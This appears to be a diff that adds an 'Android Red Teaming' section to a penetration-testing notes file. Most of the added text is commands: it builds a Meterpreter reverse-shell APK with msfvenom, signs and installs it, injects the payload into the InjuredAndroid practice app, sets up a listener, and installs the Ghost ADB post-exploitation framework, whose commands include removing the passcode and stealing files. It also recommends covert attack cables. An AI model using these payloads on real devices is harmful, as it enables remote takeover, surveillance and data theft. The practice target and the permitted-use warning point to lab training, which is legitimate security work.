@@ -159,9 +159,176 @@ adb install com.einnovation.temu-patched
 
 ## Android Red Teaming
 
+> ❗ Always use the following Hardware on permitted targets, from a Red Team perspectice.
+>
+> - [O.MG Cable - Hak5](https://shop.hak5.org/products/omg-cable)
+> - [USB Ninja Cable - Hacker Warehouse](https://hackerwarehouse.com/product/usb-ninja-cable/)
+
+### Create Generic APK with Metasploit
+
+The following command will generate a `Main Activity` app, that makes the Android device reach the Kali VM machine establishing a session.
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> R> android.apk
+```
+
+- Sign the `android.apk` and upload it to the device.
+
+```bash
+# Create a Keystore
+keytool -genkey -v -keystore demo.keystore -alias demokeys -keyalg RSA -keysize 2048 -validity 10000
+
+# Sign the APK
+jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore demo.keystore -storepass demopw android.apk demokeys
+
+# zipalign the APK
+zipalign -v 4 android.apk android_signed.apk
+```
+
+```bash
+adb install android_signed.apk
+
+# or via network (to device or emulator)
+# adb -H 192.168.56.103 -P 5555 install android_signed.apk
+```
+
+- Open a `meterpreter shell` and listen for the connection
+
+```bash
+msfconsole
+use exploit/multi/handler
+# set LHOST and LPORT same as in the msfvenom command
+set LHOST <LOCAL_HOST_IP>
+set LPORT <LOCAL_PORT>
+run
+```
+
+### Inject App with Metasploit
+
+Make sure `Apktool` is updated.
+
+Download `InjuredAndroid`.
+
+```bash
+mkdir ~/apks
+cd ~/apks
+
+wget -O InjuredAndroid.apk https://github.com/B3nac/InjuredAndroid/releases/download/v1.0.12/InjuredAndroid-1.0.12-release.apk
+
+adb install InjuredAndroid.apk
+```
+
+- Inject a `Meterpreter` payload into the InjuredAndroid.apk
+
+```bash
+msfvenom -x InjuredAndroid.apk -p android/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -o InjuredAndroid_hacked.apk
+```
+
+![](.gitbook/assets/2024-01-21_12-46-46_371.png)
+
+```bash
+adb uninstall b3nac.injuredandroid
+adb install InjuredAndroid_hacked.apk 
+```
+
+```bash
+msfconsole -q
+use exploit/multi/handler
+set LHOST <LOCAL_HOST_IP>
+set LPORT <LOCAL_PORT>
+run
+```
+
+> 📌 The reverse shell may not work correctly because of Android and emulator versions or incompatibility.
+>
+> 🔗 [Manual - Embedding Meterpreter in Android APK - Black Hills Information Security](https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/)
 
 
 
+### The Ghost Framework
+
+> 🔗 [kp-forks/ghost-1](https://github.com/kp-forks/ghost-1) - Ghost Framework is an Android post-exploitation framework that exploits the Android Debug Bridge to remotely access an Android device. Ghost Framework gives you the power and convenience of remote Android device administration
+
+```bash
+cd ~/repo
+git clone https://github.com/kp-forks/ghost-1.git
+cd ghost-1
+sudo ./install.sh
+
+# Run with
+sudo ./ghost
+```
+
+- To make it work on port 5555, `adb` should be connected via tcp to the device
+
+```bash
+# Connect device with USB
+adb tcpip 5555
+adb connect <DEVICE_IP>:5555
+adb devices
+# Disconnet device USB
+```
+
+```bash
+# Similar to Metasploit
+set RHOST <DEVICE_IP>
+options
+
+run
+```
+
+![](.gitbook/assets/2024-01-21_13-13-40_372.png)
+
+```bash
+# Some Ghost commands
+Core Commands
+=============
+
+    Command        Description
+    -------        -----------
+    clear          Clear terminal window.
+    exec           Execute local system command.
+    exit           Exit and close current session.
+    help           Show available session commands.
+
+Settings Commands
+=================
+
+    Command        Description
+    -------        -----------
+    activity       Get device activity information.
+    battery        Get device battery information.
+    netstat        Get device network information.
+    sysinfo        Get device system information.
+    wifi           Control device wifi service.
+
+Managing Commands
+=================
+
+    Command        Description
+    -------        -----------
+    eatpass        Eat device passcode.
+    keyboard       Control target keyboard.
+    openurl        Open URL on device.
+    screen         Control device screen.
+    screenshot     Take device screenshot.
+    shell          Open device shell.
+    upload         Upload local file.
+
+Stealing Commands
+=================
+
+    Command        Description
+    -------        -----------
+    download       Download remote file.
+
+Boot Commands
+=============
+
+    Command        Description
+    -------        -----------
+    reboot         Reboot device.
+```
 
 ------
 
